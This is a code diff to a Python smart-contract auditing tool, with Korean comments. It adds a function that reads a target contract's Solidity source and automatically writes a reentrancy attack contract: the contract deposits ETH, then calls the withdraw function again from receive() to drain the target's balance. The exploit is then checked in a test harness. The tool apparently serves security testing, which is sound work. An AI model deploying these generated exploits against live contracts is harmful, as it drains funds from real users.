@@ -1361,7 +1361,77 @@ def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=5
             if trip: return [c1,c2], payable_map, reason
     return None
 
+def _synth_reentrancy(target_src):
+    """소스에서 (payable 예치, ETH를 되돌려주는 인출) 함수 쌍을 열거해, 악성
+    receive() 로 인출을 재진입하는 공격 컨트랙트를 합성한다. 스캐너가 재진입
+    계열을 스코어링하지 못한 경우에도 퍼저가 재진입을 직접 성립시키는 경로."""
+    src = _strip_comments(target_src)
+    fns = _functions(src)
+    deposits, withdraws = [], []
+    for f in fns:
+        if not f.get("external"):
+            continue
+        b = f["body"]
+        if f["payable"] and re.search(r"\w+\[\s*msg\.sender\s*\]\s*\+=\s*msg\.value", b) and not f["args"]:
+            deposits.append(f)
+        # 인출 후보: 값을 보내는 external 함수 (수신자·금액 표현식 무관). 무인자 또는 uint 1개.
+        if re.search(r"\.call\s*\{\s*value\s*:", b):
+            if len(f["args"]) == 0 or (len(f["args"]) == 1 and f["args"][0][0].startswith("uint")):
+                withdraws.append(f)
+    out = []
+    for dep in deposits[:3]:
+        for wd in withdraws[:4]:
+            if wd["name"] == dep["name"]:
+                continue
+            amt = len(wd["args"]) == 1
+            wsig = (f"function {wd['name']}(uint256 amount) external;" if amt
+                    else f"function {wd['name']}() external;")
+            wcall = f"t.{wd['name']}(unit);" if amt else f"t.{wd['name']}();"
+            code = (HEADER +
+                "// Strategy: reentrancy synthesis (fuzz) — deposit, then re-enter the\n"
+                "// value-returning function from receive() before the ledger clears.\n"
+                "interface ITarget {\n"
+                f"    function {dep['name']}() external payable;\n"
+                f"    {wsig}\n"
+                "}\n\n"
+                "contract Exploit {\n"
+                "    ITarget t; uint256 unit; uint256 depth;\n"
+                "    function run(address _t) external payable {\n"
+                "        t = ITarget(_t); unit = 1 ether;\n"
+                f"        t.{dep['name']}{{value: unit}}();\n"
+                f"        {wcall}\n"
+                "    }\n"
+                "    receive() external payable {\n"
+                f"        if (depth < 32 && address(t).balance >= unit) {{ depth++; {wcall} }}\n"
+                "    }\n"
+                "}\n")
+            out.append((f"reentrancy-fuzz:{dep['name']}→{wd['name']}", code))
+    return out
+
+
 def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
+    # 0) 재진입 합성: 소스에서 유도한 (예치→인출) 공격 컨트랙트를 하네스로 검증
+    try:
+        for label, ex in _synth_reentrancy(target_src):
+            try:
+                if do_verify and invariants_src:
+                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
+                else:
+                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
+            except Exception:
+                continue
+            if proven:
+                gen = {"step":"generate","title":"Exploit.sol 생성 (reentrancy-fuzz)","strategy":label,"exploit_src":ex}
+                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
+                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
+                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
+                        "balance_before_wei":meta.get("balance_before_wei"),
+                        "balance_after_wei":meta.get("balance_after_wei"),
+                        "note":"템플릿 미매치 → 퍼저가 재진입 공격을 합성해 성립시켰습니다.",
+                        "ms":int((time.time()-t0)*1000)}
+    except Exception:
+        pass
+    # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
     except Exception:
